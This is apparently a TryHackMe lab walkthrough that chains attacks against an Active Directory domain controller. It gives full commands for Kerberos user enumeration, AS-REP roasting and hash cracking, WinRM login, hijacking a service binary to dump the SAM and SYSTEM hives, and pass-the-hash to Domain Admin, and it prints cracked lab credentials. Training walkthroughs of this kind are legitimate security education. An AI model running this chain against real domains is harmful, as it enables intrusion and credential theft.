# TryHackMe – Services (Explained Walkthrough)

**Target:** Windows Domain Controller
**Domain:** `services.local`
**Focus:** AD enumeration → AS-REP Roasting → WinRM access → service abuse → SAM dump → Domain Admin

---

## 1. Kerberos User Enumeration (Why Kerbrute?)

### Why this step?

* Port **88 (Kerberos)** is open
* In Active Directory, **usernames can be validated without passwords**
* This lets us:

  * confirm which usernames exist
  * avoid password spraying blindly

Kerbrute asks the KDC:

> “Does this user exist?”

If the user exists → **VALID USERNAME**

---

### Command Used

```bash
kerbrute userenum -d services.local --dc 10.201.54.120 brute.txt
```

### What each flag means

* `userenum` → enumerate users only
* `-d services.local` → domain name
* `--dc 10.201.54.120` → domain controller
* `brute.txt` → generated username list

---

### Output (from your screenshot)

```
VALID USERNAME: j.doe@services.local
VALID USERNAME: administrator@services.local
VALID USERNAME: w.master@services.local
VALID USERNAME: j.larussa@services.local
VALID USERNAME: j.rock@services.local
```

### Interpretation

* These users **exist in AD**
* This confirms:

  * Domain is alive
  * Kerberos is working
  * We now have **targets for Kerberos attacks**

---

## 2. AS-REP Roasting (Why This Works)

### What is AS-REP Roasting?

Normally:

* Kerberos users must **pre-authenticate**
* If **pre-auth is disabled**, the KDC sends encrypted data
* That data can be cracked **offline**

This is **not brute force**, it’s a **misconfiguration abuse**

---

### Command Used

```bash
GetNPUsers.py services.local/ -no-pass -usersfile users.txt
```

### Why this works

* `-no-pass` → no credentials needed
* KDC replies **only if user has pre-auth disabled**

---

### Output Explanation

```
[-] User j.doe doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
...
$krb5asrep$23$j.rock@SERVICES.LOCAL:...
```

* Most users are protected ❌
* **j.rock is vulnerable** ✅
* We get a **Kerberos AS-REP hash**

This hash:

* cannot be used directly
* **can be cracked offline**

---

## 3. Cracking the AS-REP Hash

### Command

```bash
john --wordlist=rockyou.txt roasted.txt
```

### Why John?

* Supports Kerberos AS-REP format
* Offline cracking = no lockouts

---

### Result (from your screenshot)

```
j.rock:Serviceworks1
```

### Meaning

You now have:

* **Valid domain credentials**
* No brute force
* No alerts

This is your **initial access**

---

## 4. BloodHound Enumeration (Why Now?)

### Why BloodHound?

Credentials allow:

* LDAP queries
* Relationship mapping
* Privilege path discovery

BloodHound answers:

> “What can this user actually do?”

---

### Command

```bash
bloodhound-python -d services.local -u j.rock -p Serviceworks1 -ns 10.201.54.120 -c all
```

### Important output lines

```
Found 1 domain
Found 1 computer
Found 52 groups
Found 8 users
```

### BloodHound Graph Result

You saw:

```
j.rock → CanPSRemote → WIN-SERVICES
```

### Meaning

* `j.rock` can **PowerShell Remotely** into the DC
* This means:

  * WinRM (5985) is usable
  * No exploit needed
  * Legit admin pathway

---

## 5. WinRM Access (Evil-WinRM)

### Why WinRM?

* Clean shell
* Native Windows access
* Stable

---

### Command

```bash
evil-winrm -i 10.201.100.249 -u j.rock -p Serviceworks1
```

---

### Group Enumeration

```powershell
whoami /groups
```

Key group:

```
BUILTIN\Server Operators
```

### Why this matters

**Server Operators can:**

* Start/stop services
* Modify service binaries
* Perform service abuse

This is **privilege escalation potential**

---

### Privilege Enumeration

```powershell
whoami /priv
```

Nothing fancy here, but:

* Service abuse does **not require special privileges**
* Group membership is enough

---

## 6. Service Abuse (Privilege Escalation)

### Why services?

Windows services:

* Often run as SYSTEM
* If misconfigured → privilege escalation

You enumerated services and found:

```
cfn-hup
```

Service path:

```
C:\Program Files\Amazon\cfn-bootstrap\winhup.exe
```

You had permission to:

* change the binary path
* start the service

---

## 7. SAM Dump via Service Hijack

### What is the goal?

Dump:

* SAM
* SYSTEM

This allows:

* Local Administrator hash extraction
* Potential domain escalation (DC mistake)

---

### Custom Payload (backup.exe)

Your C# binary runs:

```cmd
reg save HKLM\SYSTEM system.bak
reg save HKLM\SAM sam.bak
```

### Service Hijack

```powershell
sc.exe config cfn-hup binpath="C:\Users\j.rock\Documents\backup.exe"
sc.exe start cfn-hup
```

### Why this works

* Service runs as SYSTEM
* Your binary runs as SYSTEM
* Registry hives dumped

---

## 8. Offline Hash Dump

### On Kali

```bash
secretsdump.py -sam sam.bak -system system.bak LOCAL
```

### Output

```
Administrator:500:...:8b12da25dea43f49cc24260308d8b51f
```

### Critical Insight

This is a **Domain Controller**
On DCs:

* Local Administrator = **DSRM**
* Author reused password ❌

This mistake allows **Domain Admin access**

---

## 9. Pass-the-Hash (Domain Admin)

### Command

```bash
wmiexec.py services.local/administrator@10.201.100.249 -hashes aad3b435...:8b12da25...
```

### Result

```powershell
whoami /groups
```

You now see:

* Domain Admins
* Enterprise Admins
* Schema Admins

**Full domain compromise**

---

## 10. SYSTEM Shell & Flag Retrieval

### SYSTEM shell

```powershell
PsExec.exe -s -i PowerShell.exe
```

Result:

```
nt authority\system
```

---

### Flag search

```powershell
Get-ChildItem C:\Users -Recurse -Filter *.txt |
Select-String THM
```

### Flags Found

```
THM{ASr3p_R0aSt1n6}
THM{S3rv3r_0p3rat0rS}
```

---

## Final Attack Chain (Mental Model)

```
Web page → usernames
Kerberos → valid users
AS-REP → password
WinRM → shell
Server Operators → service abuse
SYSTEM → SAM dump
DSRM reuse → Domain Admin
```

---

## Why this room is important

This lab teaches:

* Real AD tradecraft
* No exploits
* No noisy attacks
* Pure **misconfiguration chaining**
